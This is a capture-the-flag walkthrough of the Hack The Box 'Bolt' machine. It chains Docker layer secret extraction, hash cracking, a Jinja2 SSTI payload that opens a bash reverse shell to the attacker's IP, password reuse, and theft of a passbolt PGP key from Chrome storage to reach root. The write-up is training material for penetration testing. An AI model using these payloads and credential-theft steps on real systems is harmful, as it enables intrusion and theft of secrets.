# HTB Bolt — Full Walkthrough

**Difficulty**: Medium  
**OS**: Linux  
**Attacker IP**: 10.10.16.84  
**Target IP**: 10.129.12.81  

---

## The Hacker Mindset

Before touching a single tool, understand the goal: **enumerate everything, trust nothing, and follow every thread**. Every service is a potential entry point. Every file is a potential credential store. Every misconfiguration is a potential privilege escalation. Bolt teaches you to chain multiple small weaknesses into full compromise.

---

## Phase 1 — Reconnaissance

### Step 1: Port Scan with Nmap

```bash
nmap -p 22,80,443 -sCV 10.129.12.81
```

**Why**: Before attacking anything, you need to know what's running. Nmap with `-sCV` runs service detection (`-sV`) and default scripts (`-sC`) which fingerprint the software versions and pull metadata like TLS certificate subjects.

**What we found**:
- Port 22: OpenSSH 8.2p1 — SSH. Noted for later (potential login vector).
- Port 80: nginx 1.18.0 — A web server. First target.
- Port 443: nginx 1.18.0 with TLS — The certificate's `commonName` is `passbolt.bolt.htb`.

**Hacker mindset**: The TLS certificate is gold. It reveals a virtual hostname (`passbolt.bolt.htb`) that wouldn't be visible otherwise. Attackers always check TLS certs for subdomains.

---

### Step 2: Add Virtual Hosts to /etc/hosts

```bash
echo "10.129.12.81  bolt.htb demo.bolt.htb mail.bolt.htb passbolt.bolt.htb" | sudo tee -a /etc/hosts
```

**Why**: The web server uses virtual hosting — it serves different sites depending on what `Host:` header you send. Without adding these to `/etc/hosts`, your browser and tools will send requests to the IP directly and get the wrong (or no) response. This maps the domain names to the target IP locally.

**Hacker mindset**: Always check for virtual hosts on web servers. One IP can host many sites, each with different vulnerabilities. The nmap cert leak gave us `passbolt.bolt.htb` for free; we guessed `bolt.htb`, `demo.bolt.htb`, and `mail.bolt.htb` from context clues in the writeup and the app itself.

---

## Phase 2 — Web Enumeration

### Step 3: Explore bolt.htb

Visiting `http://bolt.htb/` shows a web design company landing page. The important things to look for:

- A **Download** button that leads to `/download` — the page offers a Docker image.
- A **Login** button.
- Chat messages on the admin dashboard (once logged in) hint that someone is worried about the Docker image leaking secrets.

**Hacker mindset**: Read everything on a page. Marketing fluff hides breadcrumbs. The internal chat about "scrubbing the Docker image" is a direct hint that the Docker image contains sensitive data.

---

### Step 4: Download the Docker Image

```bash
wget http://bolt.htb/uploads/image.tar -O image.tar
```

**Why**: The site offers a Docker image for download. Docker images are layered filesystems — each layer is a snapshot of file changes. Old layers often contain deleted files, credentials, source code, and database files that were "cleaned up" from the final image but still exist in earlier layers.

**Hacker mindset**: Whenever you see a Docker image offered publicly, download and inspect it. Companies frequently make the mistake of building images iteratively, not realising that deleted files in later layers are still recoverable from earlier ones.

---

### Step 5: Extract Credentials and Source Code from Docker Layers

```bash
# Extract the layer containing the SQLite database
tar xf image.tar a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar
tar xf a4ea7da8.../layer.tar db.sqlite3

# Query the database
sqlite3 db.sqlite3 "select * from User;"
# Result: 1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||

# Extract the Flask application source
tar xf image.tar 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar
tar xf 41093412.../layer.tar --wildcards '*.py'

# Find the invite code
grep -r 'invite_code' app/
# Result: if code != 'XNSS-HSJW-3NGU-8XTJ':
```

**Why**: 
- The `db.sqlite3` file was added in an early layer and later deleted — but it's still recoverable. It contains the admin user's password hash.
- The Flask source code reveals how the registration system works, including a hardcoded invite code check.

**Hacker mindset**: Think of Docker layers like git history — you can see everything that was ever there, not just the final state. Tools like `dive` make this visual, but raw `tar` extraction works fine once you know which layer to target.

---

### Step 6: Crack the Admin Hash

```bash
echo '$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.' > admin.hash
hashcat -m 500 admin.hash /usr/share/wordlists/rockyou.txt
# Result: deadbolt
```

**Why**: The hash format `$1$...` is md5crypt (hashcat mode 500). Rockyou is the standard wordlist for HTB boxes. Mode 500 is fast enough to crack weak passwords in seconds.

**Hacker mindset**: Never store a hash without trying to crack it. Cracked passwords are often reused elsewhere. Even if this one only works on the demo dashboard, it might also work on SSH, other users, or the mail server.

---

## Phase 3 — Gaining a Foothold (SSTI)

### Step 7: Log into bolt.htb

Visit `http://bolt.htb/login` and log in with `admin:deadbolt`. The dashboard shows an internal chat where employees discuss the Docker image potentially leaking secrets — confirming our earlier find.

**Hacker mindset**: Authenticated access means more attack surface. Read everything the application exposes — admin dashboards, chat logs, settings pages. They often leak information about other systems and users.

---

### Step 8: Register on demo.bolt.htb

Visit `http://demo.bolt.htb/register` and fill in:
- Username: anything
- Email: anything
- Password: anything
- Invite Code: `XNSS-HSJW-3NGU-8XTJ`

**Why**: The invite code was hardcoded in the Flask source we extracted from the Docker image. The demo site is a separate Flask application with its own user database. Using the same credentials, also log in to `http://mail.bolt.htb` (Roundcube webmail).

**Hacker mindset**: Information from one part of the attack always feeds the next. The Docker image gave us the source code; the source code gave us the invite code; the invite code gave us access to the demo and mail apps. This is the chain.

---

### Step 9: Server-Side Template Injection (SSTI)

**What is SSTI?**  
Flask uses the Jinja2 template engine to render HTML. If user input is passed directly into `render_template_string()` without sanitisation, the template engine processes it as code. An attacker can inject template expressions like `{{ 7*7 }}` and the server will evaluate them — giving remote code execution.

**How we found it**:  
In the Docker source code, `app/home/routes.py` imported `render_template_string` and used it with the user's `profile_update` field — the Name field in the profile settings.

**The attack flow**:
1. Start a netcat listener on Kali: `nc -lvnp 4444`
2. Log into `http://demo.bolt.htb/admin/profile`
3. Set the Name field to the SSTI reverse shell payload:
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.84/4444 0>&1"').read() }}
```
4. Click Update — this triggers an email to the registered address
5. Log into `http://mail.bolt.htb` and click the confirmation link in the first email
6. A second confirmation email arrives — click that link too
7. The second confirmation triggers the SSTI payload execution on the server

**Why two emails?**  
The app sends a "please confirm your change" email. Clicking that link triggers the actual profile update, which calls `render_template_string()` with the injected payload — executing the reverse shell.

**Result**: Shell as `www-data`

```
www-data@bolt:~/demo$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Hacker mindset**: SSTI is dangerous because it looks like innocent user input. Developers often add template rendering for personalisation (like "Hello, {name}!") without realising user input becomes code. Always test profile fields and any place where your text is reflected back in an email or page with template syntax.

---

## Phase 4 — Lateral Movement to eddie

### Step 10: Find Database Credentials

As `www-data`, look at the web application config files:

```bash
cat /etc/passbolt/passbolt.php
```

This reveals the passbolt database credentials:
```
'username' => 'passbolt',
'password' => 'rT2;jW7<eY8!dX8}pQ8%',
'database' => 'passboltdb',
```

**Why**: Web applications must store their database credentials somewhere on disk. Config files in `/etc/`, `/var/www/`, or the app root are the first places to look. `www-data` can read `/etc/passbolt/` because the web server needs these credentials to run.

**Hacker mindset**: Credentials in config files are often reused for system users. Always try found passwords against every user on the system.

---

### Step 11: Switch to User eddie

```bash
su - eddie
# Password: rT2;jW7<eY8!dX8}pQ8%
cat ~/user.txt
# 650b06[redacted]4282e37775
```

**Why it worked**: The system user `eddie` reused the passbolt database password as their Linux login password. This is a classic misconfiguration — developers set up a service with a password and then use the same password for their own account for convenience.

**User flag captured.**

---

## Phase 5 — Privilege Escalation to Root

### Step 12: Read eddie's Mail

```bash
cat /var/mail/eddie
```

There's an email from clark telling eddie to use passbolt (a PGP-based password manager browser extension) and to back up his private key. This is the roadmap for escalation.

**Hacker mindset**: Mail files are always worth reading. They reveal what the user is doing, what systems they interact with, and often contain credentials or clues.

---

### Step 13: Find the PGP Private Key in Chrome Extension Storage

Passbolt stores the PGP private key in the Chrome extension's local storage (a LevelDB database):

```bash
strings "/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log" | grep -A 100 'BEGIN PGP PRIVATE'
```

**Why**: The passbolt security whitepaper explicitly warns that the private key is stored in the browser extension's local storage. If an attacker has filesystem access, they can read it. We have filesystem access as eddie.

**Why Chrome extension storage?** Passbolt is a browser extension password manager. It stores your PGP private key locally so it can decrypt passwords from the server. The key lives in a LevelDB file (`.log`) that `strings` can read.

**Hacker mindset**: Know your targets. Reading the passbolt whitepaper (referenced in the machine's lore) tells you exactly where the key lives. Attackers read documentation to understand how systems work and where secrets are stored.

---

### Step 14: Extract and Clean the Key

The key was embedded in JSON with `\\r\\n` as escaped line endings (double-backslash sequences). We used Python to:
1. Transfer the raw log file via netcat
2. Replace the 6-byte escape sequences `\\r\\n` with real newlines

```python
data = open('eddie.key', 'rb').read()
data = data.replace(b'\\\\r\\\\n', b'\n')
open('eddie_clean.key', 'wb').write(data)
```

**Why**: The LevelDB log stores JSON, and JSON escapes newlines as `\n`. When those JSON strings are themselves stored in another JSON layer (the extension's config), they get double-escaped to `\\r\\n`. We need to unescape them to get a valid PGP key file that GPG can read.

---

### Step 15: Crack the PGP Key Passphrase

```bash
gpg2john eddie_clean.key > eddie.john
john eddie.john --wordlist=/usr/share/wordlists/rockyou.txt
# Result: merrychristmas
```

**Why**: PGP private keys are encrypted with a passphrase. John the Ripper has a GPG cracking mode. With the key converted to john's hash format via `gpg2john`, we can dictionary attack the passphrase.

**Hacker mindset**: Any protected secret is only as strong as its passphrase. `merrychristmas` is a weak passphrase that appears in rockyou. Users choose memorable passphrases, and memorable often means guessable.

---

### Step 16: Get the Encrypted Secret from passbolt Database

```python
# Run on target as eddie
import subprocess
r = subprocess.run(
    ['mysql', '-u', 'passbolt', '-prT2;jW7<eY8!dX8}pQ8%', 'passboltdb', '--raw', '-N', '-e',
     "select data from secrets where user_id='4e184ee6-e436-47fb-91c9-dccb57f250bc';"],
    capture_output=True)
with open('/tmp/secret.asc', 'wb') as f:
    f.write(r.stdout)
```

**Why**: passbolt stores passwords encrypted with the user's PGP public key in the database. Only the holder of the corresponding private key can decrypt them. We now have both the private key AND its passphrase, so we can decrypt.

**Why Python instead of mysql CLI directly?** The mysql terminal output garbles binary/multi-line data when the TTY isn't fully set up. Python's subprocess captures the raw bytes cleanly.

---

### Step 17: Import Key and Decrypt the Secret

```bash
gpg --batch --import eddie_clean.key
gpg --pinentry-mode loopback --passphrase merrychristmas -d secret.asc
# Result: {"password":"Z(2rmxsNW(Z?3=p/9s","description":""}
```

**Why**: We import eddie's private key into our local GPG keyring, then decrypt the PGP message from the database. The decrypted content is a JSON object containing the password stored in passbolt — which turns out to be the **root password**.

**Hacker mindset**: Password managers store the most sensitive credentials. Compromising a user's password manager is often the fastest path to full system compromise. Here, the root password was stored in passbolt for "convenience."

---

### Step 18: Become Root

```bash
su -
# Password: Z(2rmxsNW(Z?3=p/9s
cat /root/root.txt
# d39451[redacted]3505cbab2f
```

**Root flag captured.**

---

## Full Attack Chain Summary

```
Docker image download
        ↓
Extract SQLite DB → crack admin hash (deadbolt)
Extract Flask source → find invite code (XNSS-HSJW-3NGU-8XTJ)
        ↓
Login to bolt.htb as admin
Register on demo.bolt.htb with invite code
Login to mail.bolt.htb with same creds
        ↓
SSTI via profile Name field → reverse shell → www-data
        ↓
Read /etc/passbolt/passbolt.php → DB password (rT2;jW7<eY8!dX8}pQ8%)
su eddie with DB password → USER FLAG
        ↓
Read /var/mail/eddie → hint about passbolt extension
Extract PGP private key from Chrome LevelDB
Crack passphrase with john → merrychristmas
        ↓
Query passbolt DB for encrypted secret
Decrypt with eddie's PGP key → root password (Z(2rmxsNW(Z?3=p/9s)
su root → ROOT FLAG
```

---

## Key Lessons

| Lesson | Why it matters |
|--------|---------------|
| Docker images leak historical data | Old layers preserve deleted files. Always inspect every layer. |
| Hardcoded secrets in source code | Invite codes, API keys, passwords — grep for them. |
| SSTI is RCE | Any user input reaching `render_template_string()` is dangerous. |
| Password reuse | The DB password worked for the system user. Always try passwords everywhere. |
| Browser extension storage is readable | If you have FS access, you can read extension keys. |
| Password managers store the crown jewels | Compromising passbolt gave us root. |
| Weak passphrases on strong keys | A 2048-bit RSA key protected by `merrychristmas` is not strong. |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service fingerprinting |
| `tar` / `sqlite3` | Docker layer extraction and DB querying |
| `hashcat` | Cracking md5crypt hash |
| Roundcube webmail | Receiving SSTI confirmation emails |
| `nc` (netcat) | Reverse shell listener and file transfer |
| `gpg2john` + `john` | Cracking PGP key passphrase |
| `gpg` | Decrypting the passbolt secret |
| Python | Extracting and cleaning the PGP key; querying MySQL cleanly |
